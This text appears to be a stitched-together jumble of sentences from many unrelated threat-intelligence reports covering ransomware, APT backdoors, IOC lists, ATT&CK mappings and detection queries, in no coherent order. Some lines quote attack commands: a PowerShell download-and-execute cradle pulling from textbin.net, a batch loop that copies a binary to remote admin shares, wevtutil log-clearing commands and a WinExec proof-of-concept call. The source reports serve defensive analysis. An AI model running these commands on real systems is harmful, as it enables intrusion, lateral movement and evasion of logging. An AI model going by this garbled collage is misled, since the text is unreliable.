(32 bytes) salsa_nonce (eight bytes) 
G0044 Winnti Group
FBI, CISA, and HHS do not endorse any commercial product or service, including any subjects of analysis.
Risks of that nature should typically be acknowledged and prioritized at the most senior levels of an organization. 
Once the ransom note has been dropped, the malware proceeds to identify files and directories for encryption by iterating through them using the FindFirstFileW() and FindNextFileW() API functions.
“One is the PowerShell downloader script, which the attacker attempts to execute to re-infect the victim’s machine, and another is Horabot.”Analysis of the banking trojanAnalysis from Talos found that the banking trojan used in this campaign specifically targets the victim’s login credentials and financial information.
ESET Research also offers private APT intelligence reports and data feeds.
We analyzed them and concluded that the files were a SysUpdate version made for the Linux platform.
The below list provides IOCs observed during our investigation.
The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.
Camaro Dragon overlaps with previously reported activities conducted by state-sponsored Chinese threat actors, namely Mustang Panda.
Contents of the 2022%20tax_documents[.]zip The XLSX file is a benign decoy file that contains financial data from an unknown source. 
After a long-term investigation into the attack routine, we’ve determined that the full infection chain works as follows: Figure 1.
However, Remcos has often been used by threat actors for malicious purposes.
Tracking Traces of Malware Disguised as Hancom Office Document File and Being Distributed RedEyes
For more information or assistance contact Eclypsium at [email protected]. 
Low-volume phishing campaigns using template injection Microsoft has also observed this Mint Sandstorm subgroup using a distinct attack chain involving low-volume phishing campaigns and a third custom implant. 
Apr. 28, 2023. 
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
DB11CBFFE30E0094D6DE48259C5A919C1EB57108registry.batBAT/Agent.
Privilege Escalation
S0647 Turian
Depending on the operating system of the device, the malware has different persistence mechanisms.
This is the file path of the I2P dropper script, which was replaced with the padded i2pd Mach-O file.
It does this by trying to find the node name, in this case, “TwXfx”, with an appended index, i.e., “TwXfx_0”.
S1047 Mori
The first note was first observed around January 2022, and the other one first appeared in August 2022.
We have observed similar traits in previous cases where Emotet and Quantum were seen. 
The registration of applications in Azure AD therefore seems to be a relatively predictable threat actor behavior [3][4].
The transport-level protocol depends on the connection type indicated in the configuration.
[T1484.001]. Exfiltration Royal actors exfiltrate data from victim networks by repurposing legitimate cyber pentesting tools, such as Cobalt Strike, and malware tools and derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration.
%s " fullword ascii $s16 = "Mind@ falcon+ illumination repair/
The malware connects to a SQL server from the executing host using the settings retrieved using SystemSettings.
Proxy: External Proxy T1090.002 The team used redirectors to redirect C2 traffic between the target organization’s network and the team’s C2 servers. 
In some instances, they used Windows Management Instrumentation (WMI)
The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool. 
By examining the components of the rogue firmware and other malicious artefacts from the target’s network, we were able to reach the following conclusions: 
TA0006 Credential Access T1003.001.
Application Layer Protocol: Web Protocols T1071.001 
Malware samples were passed to BleepingComputer, which in turn published a blog post on the ransomware on Nov. 29, 2022.
OneNote Campaigns in the wild Figure 1 Campaign Heatmap Figure 1 shows the geo wise distribution of McAfee customers detecting malicious OneNote files. 
SMOKEDHAM In Action SMOKEDHAM was observed executing commands on the target system using PowerShell. 
Figure 4: Code responsible for downloading cron_script file A misconfigured web host gives up the goods Given the malware’s reliance on remote C2 infrastructure, it made sense to scout out the web host used in the attack to get more information about the malware’s capabilities.
T1569.002
S0254 PLAINTEE
Dropbox configuration and upload RAR data Footprint Hidden and Elimination Threat actors run PowerShell scripts with previous versions of PowerShell that do not support Script Block Logging with the intent to evade being detected while running the malicious scripts (so-called “Downgrade Attack”).
The well-known IcedID version consists of an initial loader which contacts a Loader C2 server, downloads the standard DLL Loader, which then delivers the standard IcedID Bot. 
But what happens when the executable tries to call a function in one of those dependencies?
It does this by checking if the cookie hostname contains facebook.com and collects the session specific cookies xs and c_user that store the user ID and session secret respectively. 
Microsoft doesn’t enforce search order for a range of reasons, such as enabling things like portability and backwards compatibility—for example, portable browser applications that use older Microsoft libraries.
Watch.targets"
This is first observed under the createservices function. 
If so, it reads the 64-bit loader (msvcr120d.dll) from disk and runs it as a shellcode. 
Domain Trust Discovery [T1482] Account Discovery: Domain Account
[D3-SBV] Process Analysis File Access Pattern Analysis
Figure 5 OneNote Header 
This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon: "C:\Windows\system32\NOTEPAD.EXE" C:\Users\installer.baywaterschool\Downloads\pon.txt pon.txt contents: powershell iex((new-object net.webclient).downloadstring('https://textbin.net/raw/ls1jhefawt')) 
Uses Heaven Gate technique to redirect it’s execution under x64 OS. 
Monitoring clipboard events to steal clipboard content. 
Clicking the image in the spam email leads to this website indicating a prize has been wonThe fine print, visible only by scrolling to the very bottom of a subsequent page, revealed that in providing their credit card information, recipients were not paying a shipping fee for their prize, but were in fact agreeing to be charged fees for several paid subscription services in order to enter into a sweepstakes for the prize.
<= 164 and pe.rich_signature.toolid(257, 29395)
After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM. 
IP_ADDRESS_1 C:\Windows\System32\mstsc mstsc.exe /v:IP_ADDRESS_2 C:\Windows\SysWOW64\explorer.exe "C:\Windows\SysWOW64\explorer.exe" \\IP_ADDRESS_1\C$ C:\Windows\SysWOW64\explorer.exe "C:\Windows\SysWOW64\explorer.exe" \\IP_ADDRESS_2\C$ Lateral Movement Cobalt Strike Remote Service Creation The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts. 
b. Register a new service that will run its VBS script (4.1) using sc.exe. 
key[j % size]; data[j] ^= key_stream[v4 + 256]; } } view raw nsis_decrypt.cpp hosted with :red_heart: by GitHub 
Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities: Taking full control of the infected machine Recording keystrokes in real time with offline logging available Accessing live web cam feeds including microphone recording Downloading files remotely Remote shutdown and reboot Disabling user input Over Gh0st RAT’s long life, Chinese nation-state threat actors have used it to breach high-value targets such as governments, embassies, economic targets, and media.
Powershell Vice Society utilizes PsExec for execution, persistence and defense evasion. 
The files involved in this attack were submitted to VirusTotal.
These queries were recorded in text-based logs that existed under the path C:\Users\<user>\AppData\Local\Microsoft\Office365\Powershell\. Similar logs (for Azure AD instead of O365) can be found under the path: 
Finding another note.gif (SHA2: 0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715) based on the same infection chain let us continue our quest to the payload. 
T1124System Time DiscoveryDolphin obtains the victim’s current time. 
In short, the attack scenario is as follows: 
CISA analysts are able to identify Federal Government systems that may be susceptible to exploitation attempts by using Shodan, the CVE database, and the NVD to enrich NCPS information.
By using our toy Pedersen hash example, given a message M whose hash is equal to H(M) = H(M1 M2) = ⟨M1⟩ ⋅ G1 + ⟨M2⟩ ⋅ G2, the colliding message M’ is computed such that\nH(M’)
T1027.
Once the fingerprinting has been done, the malware will install the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.
Microsoft Defender for Endpoint detects this malware and related malicious activity on both Windows and Linux devices.
C0016 Operation Dust Storm
If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1).
title: FinSpy: unseen findings url: https://securelist.com/finspy-unseen-findings/104322/ FinSpy, also known as FinFisher or Wingbird, is an infamous surveillance toolset.
Windows task XML file for IronNetInjector.
For example, UNC4857 and suspected FIN11 threat cluster UNC2546 have both used zero day vulnerabilities to target file transfer systems, then used tailored web shells for data theft.
Transparent Tribe APT36  PakistanAligned Threat Actor Expands Interest in Indian Education Sector
TcpConnector also has the parameter interval, which indicates how long to wait before trying to reconnect. 
Known TeamTNT malware repository.
Attribution of the 3CX supply-chain attack to Lazarus What is already published There is one domain that plays a significant role in our attribution reasoning: journalide[.]org.
title: EvilExtractor – All-in-One Stealer url: https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer Affected platforms: WindowsImpacted parties: Any organizationImpact: Controls victim’s device and collects sensitive informationSeverity level: Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices.
Organizations can implement mitigations of varying complexity and restrictiveness to reduce the risk posed by threat actors who use Tor (The Onion Router) to carry out malicious activities.
External Remote Services The threat actor used VPNs to gain access to systems and persist in the environment Credential Access T1555.003: Credentials from Password Stores: Credentials from Web Browsers The threat actor exported saved passwords from user’s Chrome browser installations Credential Access T1539:
They used this access to obtain the cached credentials of all logged-in users—including the New Technology Local Area Network Manager (NTLM) hash for the SharePoint server account.
The emails exploit commonly encountered issues, such as transit infractions and taxes, to create a sense of urgency and legitimacy in their phishing messages.
Layer 3: It is the final GuLoader shellcode.
FROM micros.caedc_driver_def SELECT *
Detect: File Analysis Dynamic Analysis
These languages allow direct memory manipulation, access to system APIs, and the ability to write efficient and optimized code. 
Symmetric Cryptography Winnti uses AES for encrypting traffic in its backdoors T1008 Fallback Channels The Winnti configuration supports indicating multiple C2 servers of various types T1095 Non-Application Layer
EXCEPTION_ACCESS_VIOLATION instructions pattern. 
Note that the result is creation of a new file (where the encrypted stream is written).
Reduce MFA token/Session cookie validity timesEnsure principle of least privilege for user accounts is being adhered to.
Once the malware has de-XOR’d all its strings, it invokes a method named go.
Figure 19 – Basic decoy setup Illustrating and Achieving Network Deception 
It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.
We will also share sample detection rules, and hunting recommendations to find similar activity in your environment. 
The original dropper process continues to execute in order to orchestrate the mining operations.
As a first attempt, let us simply interpret the 6-bit value as an integer encoded in little-endian bits, resulting in an integer in the range {0, 63}.
8c80dd97c37525927c1e549cb59bcbf3 frsocks: da0c13d834cafc010bec1afa2d76196ced71e661 Mimikatz: 449da3d7405c2c79fa55bd7973096e28 0078ff05c20689f40ea9cb8c47fcfb2e52cdc3a9 BitMiner: 5430039162e58c44f9a5941295b55fba Polar: 
File system FlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database. 
However, every once in a while, a campaign appears that turns this paradigm on its head.
TickCount variable.
In addition, the randomly named directories are typically created in a previously existing directory that’s one level off of the root of the C drive.
The definition and the different attacks are accompanied by a toy example to illustrate the various concepts more concretely.\n
The sought-after information is stored between data xml tags (<data>%version%</data>) of the response from the service. 1234567891011121314151617181920 POST /%s
CONCLUSIONS 
After execution, the output of commands is uploaded.
TA0040 Impact T1486 Data Encrypted for Impact LockBit 2.0 is known for its extortion tactics, encrypting devices and demanding a ransom. 
Based on log and meta data found on the server, EclecticIQ analysts assess with high confidence the threat actor performed offensive cyber operations, including reconnaissance, malware delivery, and post-exploitation against selected targets.
X32dbg:
Stealing Credentials from LSASS Process Memory The Local Security Authority Subsystem Service (LSASS) process manages and stores the credentials of all the users with active Windows sessions.
Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”.
End users and enterprises alike can mitigate the risk of infection from new threats like Royal ransomware by following these security best practices: Enable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network. 
ARCHIVE=`grep --text --line-number '^__x64xx__$' "$0" | cut -d ':'
CrowdStrike determined that in these cases, administrative users had “reset” their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.
Inside the Mind of a Cyber Attacker from Malware creation to Data Exfiltration Part 1
Infection process based on deception 
We also encourage our peers in the industry to share information with us in case you have more evidence. 
Next, it will launch “notepad.exe” with an argument to the ransom note file to show the user what happened on the system: Figure 16.
Shellcode The malware and shellcode were allocated memory in the process space using VirtualAlloc.
Similar to other banking Trojans, Kronos' main module ran within svchost.exe and orchestrated the whole operation from the remote svchost.exe process. 
The first malicious IronPython scripts of the tool we describe here were discovered last year by a security researcher from FireEye.
Valid Accounts
The procedure involves utilizing the instruction itself, and it goes as follows: 
The operators and developers of the Rorschach ransomware remain unknown.
The Remcos RAT identified in this case communicates to zazuservr[.]com over port 9019. 
Write in the registry After the writing in the registry has been completed, it will get some privileges using a token as SE_DEBUG_PRIVILEGE and SE_IMPERSONATE_PRIVILEGE: Figure 13.
Hide Artifacts T1564.001:
T1497.003Virtualization/Sandbox Evasion: Time Based EvasionSimplexTea implements multiple custom sleep delays in its execution. 
This makes it easier to identify a potential Cobalt Strike server, however, defenders should be aware that this outcome alone is prone to false positives.
(Email) 
Contains the imported unmanaged function declarations and win32 structures/constants. 
Uses EnumDeviceDrivers and GetDeviceDriverBaseNameA APIs. 
While the trojanized 3CX macOS application shows it was signed in late January, we did not see the bad application in our telemetry until February 14th, 2023.
Using Zcash’s encoding rules, hashing the message we’ve been using so far, and running our toy example implementation, we can proceed as follows:\n# ======================================= #\n#   Vulnerability 2 - Related Generators  #\n# ======================================= #\n\n#
Figure 10 shows the concatenated data in a text file called “Credentials.txt”. 
Remote Services:
In one case, the proxy server 168.106.1[.]1 is specified there in addition: <?xml version="1.0" encoding="utf-8"?> <Config Group="aa" Password="test" StartTime="0" EndTime="24" WeekDays="0,1,2,3,4,5,6"> <HttpConnector url="http://db311secsd.kasprsky[.]info/config/" proxy="http://168.106.1[.]1/" interval="30-60"/> </Config> <?xml version="1.0" encoding="utf-8"?> <Config Group="aa" Password="test" StartTime="0" EndTime="24" WeekDays="0,1,2,3,4,5,6"> <HttpConnector url="http://db311secsd.kasprsky[.]info/config/" interval="30-60"/> </Config> 
S0062 DustySky
Application Hardening [D3-AH] 
S0461 SDBbot
TA0003 Persistence T1136.
The initial stage of the Installer is the following shell script:#!/bin/sh ELF_MAGIC=7f arch=`od -j4
S1073 Royal
Iran took that as a wake-up call and began investing in and improving its cyberwarfare capabilities.
Figure 3: Details of the recent Gh0st RAT sample’s C2 server on the network information service Shodan.
PayloadsTalos found that the payloads employed by the attacker in this campaign are designed to steal sensitive information, evade detection and disseminate additional phishing emails to the victim’s contacts.
Other related campaigns uncovered during this investigation are detailed later in this article. 
Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.
It is computed by hashing the following data: The physical address of the network interface The domain name of the device The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography The backdoor also generates a pseudo-random URI that is requested on the C2 domain.
Vice Society United States victimology (all leak site victim data).Impacted Industry Verticals Although Vice Society has been in the headlines for targeting educational organizations, they also extort victims in many other industry verticals, as shown in Figure 6, including those supplying critical infrastructure, such as healthcare, government entities and manufacturing. 
Input Capture:Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. Person in the Browser T1185 TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified webpage. Command and Control
Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.
Figure 12.
Enable logging for new user creation, especially domain administrator accounts
The third C&C server, 5.188.33[.]190, has rather unique SSL certificates with Alternative names mail.mofa.gov.tw, intra.mofa.gov.tw, and *.mofa.gov.tw.
Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.
Viewing the section of a file (see technical analysis on this packer here). 
PS Exec CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Command and Scripting Interpreter (T1059.003) Windows Command Shell CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Native API (T1106) Use Windows API functions to inject DLL CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Windows Management Instrumentation ((T1047) 
Spearphishing Attachment (T1193) 
3. Automation in 2018 and 2020 Here is the script used to automatically install a cryptocurrency miner on a list of computers in 2018: @echo off for /f
The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller. 
This ensures that the malware will be launched during the next reboot, skipping the installation part. 
The zipped folder usually holds the following file patterns: Executable.
But there were many lessons learned.
Arkime is a tool that we use a lot to investigate network activity and gather indicators.
PlugX, Winnti and some other custom tools all point to a group that had access to the same tools.
ExecutionT1204.002User
Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding.
By: Earle Maui Earnshaw, Nathaniel Morales, Katherine Casona, Don Ovid Ladores June 06, 2023Read time: ( words) Save to Folio Subscribe After first being detected in June 2021, the TargetCompany ransomware family underwent several name changes that signified major updates in the ransomware family, such as modifications in encryption algorithm and different decryptor characteristics. 
It is also important to note that all the compromised admins didn’t have MFA enabled, which could have stopped the attack.
title: #StopRansomware: Royal Ransomware url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a SUMMARY Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors.
It was observed that the threat actor did not always use the application right after it was deployed.
, the decrypted memory structure contains executable code.
These elements, in turn, contain another serialized array, which contains a message string ID (which will be used to send the result of the command) plus the data for the command. 
We also discovered that GoBruteforcer had deployed an internet relay chat (IRC) bot on the victim server, which communicates with the attacker’s server. 
T1132.002Data Encoding: Non-Standard EncodingLookBack encodes binary data using a custom hex-encoding method. T1573.001Encrypted Channel:
At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.
This ransomware family was first observed in December 2020, primarily targeting Windows systems.
Use a network intrusion prevention system (IPS) to scan and remove malicious email attachments. 
The Cofense® and PhishMe® names and logos, as well as any other Cofense product or service names or logos displayed on this blog are registered trademarks or trademarks of Cofense Inc. 
Other samples leverage the function Delegate.
Cyble Research and Intelligence Labs (CRIL) recently observed an ongoing campaign by SharpPanda APT.
The team then deployed Rubeus to capture the incoming DC TGT [T1550.002], [T1557.001].
Develop and monitor the network and system baselines to allow for the identification of anomalous activity.
The differences come within the binary itself by how the code is/was structured and how they obfuscate the sample.
That function will perform the final stages of the installation and load the DLL containing the backdoor functionality. 
517488F6BD0E7FC9EDE82F37226A75212B277E21hidmouse.sysWin64/Agent.
DeviceNetworkEvents | where RemoteIP in("176.65.137.5","176.65.137.6") | where ActionType == "InboundConnectionAccepted" | where Timestamp > ago(30d) |project Timestamp, DeviceId, DeviceName, RemoteIP, RemotePort, LocalIP, LocalPort, InitiatingProcessFileName Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.
File Created in Startup Folder Following the creation of persistence, two large arrays of decimal bytes were decoded by the function shown in Figure 4. Figure 4 - Decoding Function Porting the decoding function to Python, we created a script (Figure 5 below).
5086014001000000 40610fecfb7f0000 "cmd.exe /C calc" Running the PoC application with all parameters With the above command we provided the following parameters:00001e000000 as a storage buffer for our counterfeit object,5086014001000000 as the Invoker vfgadget in addition to40610fecfb7f0000 which is the WinExec memory address. 
Figure 16.
Key points in this blogpost: ESET researchers analyzed Dolphin, a previously unreported backdoor used by the ScarCruft APT group. 
Once a foothold is established, the attackers conduct a variety of reconnaissance, credential theft, lateral movement, and data exfiltration activities. 
Persistence tactics are used by malware operators to obtain and maintain access to devices.
The LNK file contains a PowerShell command, as seen below as an example.
Initial AccessT1190Exploit Public-Facing ApplicationTA410 has exploited web server vulnerabilities for initial access. 
G1 + (56 + 2 * 139)
Darktrace has detected a growing trend in actors creating and assigning permissions to a Service Principal named ‘PerfectData Software’.
Figure 6.
Figure 9 OneNote drops embedded artifacts in Temp directory Qakbot Campaign 1: This section contains specific details on a Qakbot campaign.
Google document The spoofed destination of the URL redirects the target to an attacker-created website that masquerades as a legitimate Google Docs site for requesting document access, such as https[://]drive-google[.]shanumedia[.]com/pdf/ul/ji78fghJHKtgfLKJIO/s2.php?menu=ZGFu[...]vbQ== The Base-64 encoded segment, that is, the value of the menu URL query parameter, resolves to the target’s email address. 
35bb66f1cc9e820ef50c22d0abb0f5f7ba8724bebb4a5a795e68790943742928 .zip 9bf413a9d9b3b17767f0a93450f834947475765b2fd1ecccaa943f8ce9d58082 document.zip 9a2f837a8adb16632ce4ec3c8b02037a4e96e66e6737ef1169afb2e48e46aa6a letter.zip bfaf49a691792a29024a75119a9841caacefb306494ca011a42b46c12ca65895 .zip 59ad199d81590be7b83768227fe3a79b115f6c978b8715864ae0e22e5d324e36 mail.zip ecda9c446dd6aa0018cd5fc9c99ba846484f8d2a81d7f97167d89b890e4d5c1a attachment.zip e745cc1ae5a89a9f2b4b0eabbac342520703b03f68dafeb6d29194fe19e899e9 attachment.zip 1f442b9ff3c9225e3eaa9c74d16b3a74117bb66e1d372ca15b6154d386a93e57 Network-Based IOCs: IOC IOC type 15.244.197.9:1042 Attempted C2 Connection 141.240.203.6:1042 Attempted C2 Connection 16.115.197.163:1042 Attempted C2 Connection 67.120.102.206:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection 166.77.123.68:1042 Attempted C2 Connection 198.89.160.22:1042 Attempted C2 Connection 15.98.11.12:1042 Attempted C2 Connection 67.121.94.10:1042 Attempted C2 Connection 15.24.69.27:1042 Attempted C2 Connection 129.204.109.121:1042 Attempted C2 Connection 70.241.87.215:1042 Attempted C2 Connection 16.80.195.68:1042 Attempted C2 Connection 15.9.79.129:1042 Attempted C2 Connection 15.14.59.199:1042 Attempted C2 Connection 216.114.194.30:1042 Attempted C2 Connection 15.228.15.126:1042 Attempted C2 Connection 16.100.121.101:1042 Attempted C2 Connection 15.63.9.76:1042 Attempted C2 Connection 65.6.113.38:1042 Attempted C2 Connection 141.240.211.237:1042 Attempted C2 Connection 16.83.199.36:1042 Attempted C2 Connection 66.248.57.65:1042 Attempted C2 Connection 15.59.127.133:1042 Attempted C2 Connection 16.150.138.126:1042 Attempted C2 Connection 141.154.253.115:1042 Attempted C2 Connection 66.43.244.133:1042 Attempted C2 Connection 68.158.45.83:1042 Attempted C2 Connection 152.16.43.135:1042 Attempted C2 Connection 129.81.101.242:1042 Attempted C2 Connection 16.102.137.19:1042 Attempted C2 Connection 16.102.153.27:1042 Attempted C2 Connection 67.171.253.156:1042 Attempted C2 Connection 15.75.188.252:1042 Attempted C2 Connection 216.128.188.41:1042 Attempted C2 Connection 16.126.107.216:1042 Attempted C2 Connection 16.125.202.53:1042 Attempted C2 Connection 162.28.185.188:1042 Attempted C2 Connection 195.75.252.98:1042 Attempted C2 Connection 68.223.45.7:1042 Attempted C2 Connection 24.148.141.102:1042 Attempted C2 Connection 141.240.190.28:1042 Attempted C2 Connection 129.243.132.29:1042 Attempted C2 Connection 148.193.135.228:1042 Attempted C2 Connection 24.190.210.189:1042 Attempted C2 Connection 12.166.196.8:1042 Attempted C2 Connection 15.228.161.161:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection 
This is most likely due to the complex process of setting up the necessary infrastructure.
Remote Services RDP is used by the group for lateral movement. 
Both domains were registered during the time of the campaign. 
Unsurprisingly, if the victim allows notifications, they are bombarded with ads from the “virtualpushplatform[.]com” domain, including ads for fake antivirus software, fake coupons, and free iPads. 
Additionally, no matter how impeding a mitigation might be, we need to broaden our horizon if we want to find any weaknesses. 
Data files and executables are also written to ~\Program Files (x86) \Google\Temp.
Use of BlackCat ransomware has grown quickly for a variety of reasons (for comparison, AvosLocker had only listed a handful of victims publicly within two months of becoming known).
These are CLFS containers that are referenced in a master .blf
MITRE ATT&CK techniques Note: This table was built using version 7 of the MITRE ATT&CK framework. 
Even though network monitoring and detection capabilities do not come easy for many organizations, they can generally offer a high return on investment if implemented correctly.
This form of binary instrumentation typically requires the attacker to obtain the original image, then parse and change it to introduce malicious logic.
It checks running processes for executables of several known cybersecurity vendors.
[TA0002] Table IV: Chinese state-sponsored cyber actors’ Execution TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Command and Scripting Interpreter
This extension permitted bypassing MFA requirements, as the cookies, replayed through the Cookie Editor extension, allowed the threat actor to hijack the already MFA-approved session of a targeted user. 
“ffmpeg.dll” will try to decrypt it using the RC4 encryption scheme with the key “3jB(2bsG#@c7”. 
Unlike the Windows version that features numerous installers, the macOS version has only one installer type. 
The Crimson RAT payloads we analyzed use the richa-sharma.ddns[.]net domain for C2 purposes and support either 40 or 65 commands, most of which have been documented in previous research.
Threat actors performed a full reconnaissance by specifying the flag -group=all: Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt" VulnRecon Threat actors dropped two binaries named vulnrecon.dll and vulnrecon.exe on two hosts.
This method, commonly employed in phishing attacks, creates a discrepancy between the perceived legitimacy of the link (a genuine Google document) and the actual website visited upon clicking the URL. 
Every second, the orchestrator, which lives in memory only, reads the cleartext rsa.txt file to check whether there are new commands to execute.
The payload InstallStager.exe is a compilation of the open-source rootkit named r77-rootkit – a fileless ring 3 rootkit written in .NET.
S0342 GreyEnergy
Monitor for and correlate changes to Registry entries. 
These are focused on dynamic IOAs, such as malware, exploits and other threats. 
In addition to the code reuse, we can see remnants of the Apostle execution flow in Fantasy.
They include Crosswalk and Metasploit injectors, the juicy-potato utility, and samples of FunnySwitch and ShadowPad. 5.
We also attempted to notify the company of this incident through all their listed channels but have received no feedback. 
Since 2018, we have seen the following targets, also depicted in Figure 1: FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company LookingFrog: Diplomatic missions, charity, government and industrial manufacturing JollyFrog: Education, church, military, diplomatic mission Figure 1.
DefaultUserName /t
Fortinet Protections The FortiGuard Antivirus service detects and blocks this threat as ELF/Mirai, Linux/Mirai, and ELF/Gafgyt. 
See Figure 1 for a timeline of the red team’s initial access and lateral movement showing key access points. 
If the prepared file name is: 201a, obtains the list of processes and sends it to the C2 server. 201b, gets the list of recent files and sends it to the C2 server. 243a, takes a screenshot and uploads it to the C2 server. 0x8054A0, 0x805BA0, 0x8056A0, 0x805DA0, 0x8057A0, 0x805EA0 
backdoor hashsync-system-time[.]cfDomainDrokbk C2 infrastructureupdate-windows-security[.]tkDomainDrokbk C2 infrastructuredns-iprecords[.]tkDomainDrokbk C2 infrastructureuniversityofmhealth[.]bizDomainDrokbk C2 infrastructureoracle-java[.]cfDomainDrokbk C2 infrastructure54.39.202[.]0 IP addressDrokbk C2 infrastructure51.89.135[.]15IP
ylfdup > \\.\pipe\ylfdup 
(In SeroXen case it’s
Administrators can also block the following URLs: http://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://software-nas/Swhttp/LiveUpdate4 Researchers at Eclypsium Labs are continuing to investigate for any signs of malicious activity related to this discovery.
We mentioned previously that Ahnlab reported a similar attack earlier this year.
S0038 Duqu
To avoid running more than one instance of itself, BazarLoader will create a mutex with a hard-coded UUID, then use kernel32.GetLastError to check for the error ERROR_ALREADY_EXISTS.
The following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS: Ransomware Towards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain.
Based on foundational work from the early 1990s that also led to the formalization of commitment schemes (see for example [CHP91] and [Ped91]), the (originally-named) PedersenHash function was recently put in the spotlight when Zcash researchers Sean Bowe and Daira Hopwood developed specific optimizations for its efficient instantiation in zk-SNARK circuits
Service account passwords were strong.
Don’t have the time or skills for reverse engineering the volume of packed and obfuscated files your SOC team handles? 
One such breach was the operation known as “GhostNet” in 2009, in which a large-scale cyber-attack used Gh0st RAT to conduct surveillance and espionage.
Lateral MovementT1021.002Remote Services: SMB/Windows Admin SharesAgrius operators used cached credentials to connect over SMB to systems within an exploited internal network. 
As LSASS dumps are nowadays recognized by the dump file itself this is a nice way to get your hands on the file.
Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists. 
In the next procmon screenshot the flow can be seen: Procmon with pasting dbexport.zip in location bar At first the local on path folders are tested and if that fails the WebDAV Client is started and the dll loaded. 
c:\windows\system32\wevtutil.exe cl systemc:\windows\system32\wevtutil.exe cl securityc:\windows\system32\wevtutil.exe cl
Fileless malware typically uses a legitimate application to load the malware into memory, therefore leaving no traces of infection on the machine and making it difficult to detect.
G551JW or DESKTOP-B83U7C5 may be the names of the machines where Crimson RAT developers have been running test executions. 
For DC6.exe, Trigona hid the installer for Advanced Port Scanner within Inno Setup installer to evade static signature detection. T1112.
The only difference among them was the encrypted file, which pointed to different C&C servers. 
Figure 5: Command inside BAT script (4.3) decrypting and running the ransomware The final payload is LockBit.
The group claimed the attack via Twitter using the hashtag “TangoDown” to indicate the bank’s hosting server was down globally.
The use of infostealers by former Trickbot/Conti members and their distributors is not without precedent — other security researchers observed the Vidar infostealer delivered during DEV-0569 Batloader campaigns that also led in some cases to Cobalt Strike and Royal ransomware.
F6 50 87 F4 E9 AE 11 ED 65 0D 83 E8 Kuwait Telecommunications company certificate [1] Original, legitimate driver’s MD5 is 015caeec9148194054b5b1de64762a43 
S0447 Lokibot
Unfortunately, we don’t have the HTA script (Blockchain.pdf), but we can assume the functionality of the script based on our telemetry – showing the decoy document and fetching the next stage payload.
Encoded Royal Road payload On October 13th 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to VirusTotal. 
%%i in (c:\programdata\list.txt) do ( net use \\%%i\c$ "*" /u:*\administrator copy c:\programdata\vmnat.exe \\%%i\c$\windows\system32\vmnat.exe SCHTASKS /Create /S
This Service Principal creation represents the registration of an application called ‘PerfectData Software’ in Azure AD. 
Any observations contained in this blog regarding circumvention of end point protections are based on observations at a point in time based on a specific set of system configurations.
As you can see from the screenshot below, it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.
